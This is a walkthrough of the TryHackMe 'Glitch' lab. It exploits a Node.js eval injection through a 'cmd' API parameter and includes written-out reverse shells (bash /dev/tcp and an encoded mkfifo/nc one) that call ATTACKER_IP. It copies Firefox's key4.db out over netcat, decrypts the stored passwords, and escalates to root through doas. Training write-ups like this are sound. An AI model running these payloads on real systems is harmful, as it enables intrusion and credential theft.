# Glitch Walkthrough
<br/>

## Intro
Wlecome to the Glitch challenge, here is the link to the [room](https://tryhackme.com/room/glitch) on TryHackme.


"This is a simple challenge in which you need to exploit a vulnerable web application and root the machine. It is beginner oriented, some basic JavaScript knowledge would be helpful, but not mandatory. "

Whenever you feel ready press on "Start Machine" and connect via OpenVPN from your machine or use the AttackBox.

Let's begin!

<br/>
<br/>

## The Challenge
Let's begin with an nmap scan to see if there are any open ports with services running:
```bash
nmap -sV -sC MACHINE_IP
```

The output shows us that port 80 serving an nginx HTTP server is open, let's visit it:
```
http://MACHINE_IP
```

The homepage contains only a background picture, we can check the page source code, inside we can notice a JavaScript block to fetch some access info from the `/api/access` API.

Let's interact with the API and see what we get:
```bash
curl http://MACHINE_IP/api/access
```

This result in a response containing a base64 encoded token: `{"token":"REDACTED"}`.
I wonder what is the original string that has been encoded:
```bash
echo "REDACTED" | base64 -d
```

--> REDACTED

Since we have an access token it means that there must be somewhere we can access.
Let' launch a directory scan of the website:
```bash
gobuster dir -u http://10.10.241.185/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

We get:
```
/img                  (Status: 301) [Size: 173] [--> /img/]
/js                   (Status: 301) [Size: 171] [--> /js/]
/secret               (Status: 200) [Size: 724]
```

The last one looks interesting, so let's either add the token in our browser cookie or pass it as an header in a request in the terminal.
Anyway we lend on a new page with the picture of a rabbit with the word "Mad".

Let's do some more enumeration
```bash
gobuster dir -u http://10.10.241.185/api -w /usr/share/seclists/Discovery/Web-Content/common.txt 
```

Let's hit the new API endpoint:
```bash
curl http://10.10.241.185/api/items -H "Cookie: token=this_is_not_real"
```

Response
```json
{"sins":["lust","gluttony","greed","sloth","wrath","envy","pride"],"errors":["error","error","error","error","error","error","error","error","error"],"deaths":["death"]}
```

Let's see if we can interact with this endpoint using other HTTP methods:
```bash
curl -X OPTIONS http://10.10.241.185/api/items -H "Cookie: token=this_is_not_real"
```

We get `GET, HEAD, POST`, that's interesting, let's try `POST`:
```bash
curl -X POST http://10.10.241.185/api/items -H "Cookie: token=this_is_not_real"
```

This print us the message:
```json
{"message":"there_is_a_glitch_in_the_matrix"}
```

This shows that we are probably on the right path, maybe we can exploit this method uploading something.
I tried sending data JSON formatted or as a body string but got nothing, probably not the right method, maybe it uses an URL parameter.

Since we do not know which parameter, we can fuzz to find it:
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://10.10.241.185/api/items\?FUZZ\=123 -H "Cookie: token=this_is_not_real" -X POST
```

This give us the `cmd` one.
If we try to pass the `?cmd=whoami` we get the following error:
```bash
curl -X POST http://10.10.241.185/api/items\?cmd\=whoami -H "Cookie: token=this_is_not_real"
```

```
ReferenceError: whoami is not defined<br> &nbsp; &nbsp;at eval (eval at router.post (/var/web/routes/api.js:25:60), &lt;anonymous&gt;:1:1)<br> &nbsp; &nbsp;at router.post (/var/web/routes/api.js:25:60)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/var/web/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at next (/var/web/node_modules/express/lib/router/route.js:137:13)<br> &nbsp; &nbsp;at Route.dispatch (/var/web/node_modules/express/lib/router/route.js:112:3)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/var/web/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at /var/web/node_modules/express/lib/router/index.js:281:22<br> &nbsp; &nbsp;at Function.process_params (/var/web/node_modules/express/lib/router/index.js:335:12)<br> &nbsp; &nbsp;at next (/var/web/node_modules/express/lib/router/index.js:275:10)<br> &nbsp; &nbsp;at Function.handle (/var/web/node_modules/express/lib/router/index.js:174:3)
```

(NOTE: i am using *curl* here but you could use Burp Suite as well if you prefer a better graphical interface)

The error is probably caused by the fact that the web-app is using Node.js + PHP and do not recognize the `whoami` command, but this verbose error give us a hint on how to proceede.
We can use a function like `require()` to import the the `child_process` module, and then uses the `exec()` function to execute the  command we want, like this:
```bash
curl -X POST http://10.10.241.185/api/items\?cmd\=require\(%22child_process%22%29.exec\(%22ls%22%29 -H "Cookie: token=this_is_not_real"
```

This command gives us the response: `vulnerability_exploited [object Object]`.
It worked, now let's turn it in something useful, like injecting a payload that result in a reverse shell on our machine.

Firstly let's prepare a listener on our machine:
```bash
nc -lvnp 1234
```

Then we generate a simple bash reverse shell and we URL encode:
```bash
curl -X POST http://10.10.241.185/api/items\?cmd\=require\(%22child_process%22%29.exec\(%22bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/ATTACKER_IP/1234%20%3E%26%201%27%22%29 -H "Cookie: token=this_is_not_real"
```

This will gives us a shell in a couple of seconds.
Unfortunately the shell was broken this way so i have switched to the *mkfifo* one and URL encoded everything, this time worked perfectly
```bash
curl -X POST http://10.10.241.185/api/items?cmd=%72%65%71%75%69%72%65%28%22%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%22%29%2e%65%78%65%63%28%22%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%31%30%2e%39%2e%30%2e%31%30%30%20%31%32%33%34%20%3e%2f%74%6d%70%2f%66%22%29 -H "Cookie: token=this_is_not_real"
```

Once in the shell we can run `whoami`, we see we are "user", let's navigate to it's home directory and get the first flag:
```bash
cat /home/user/user.txt
```
--> REDACTED

<br/>

### Privilege Escalation
Now before proceding i decided to upgrade the shell to a fully interactive tty (follow my guide [here](https://github.com/Maat-Cyber/Maat-Cyber-World/blob/main/Tips-%26-Resources/Reverse_Shell-Upgrade.md) if you don't know how to do it).

In `.firfox`
release
```bash
cd  ~/.firefox/b5w4643p.default-release
```

Get login.json and key4.db
on our system:
```bash
nc -nlvp 4444 > key4.db
```

on target:
```bash
nc -nv ATTCKER_IP 4444 < key4.db
```


This tool https://github.com/unode/firefox_decrypt or i used this https://github.com/lclevy/firepwd/blob/master/firepwd.py
```bash
git clone https://github.com/lclevy/firepwd.git
cd firepwd
```

Install required packages:
```python
pip3 install -r requirements.txt
```

Finally run it:
```bash
python3 firepwd.py
```
(ensure the 2 files are in the same directory as the script )

And we extracted the credentials of the v0id user:
```
b'v0id',b'love_the_void'
```

Let's change user now:
```bash
su v0id
```

From the previous scan we found a binary that has the SUID bit set
```bash
ls -l /usr/local/bin/doas
```

This command allow us to run commands as other users:
```bash
doas -u root cat /root/root.txt
```

Insert the v0id user password when prompted, and... here we have the root flag content:
--> REDACTED



<br/>
<br/>

Congratulations you have successfully exploited the web application and gained access to the system to escalate your privileges and get the root flag.

I hope you had fun doing the challenge and following along.

Catch you in the next CTF 😃 
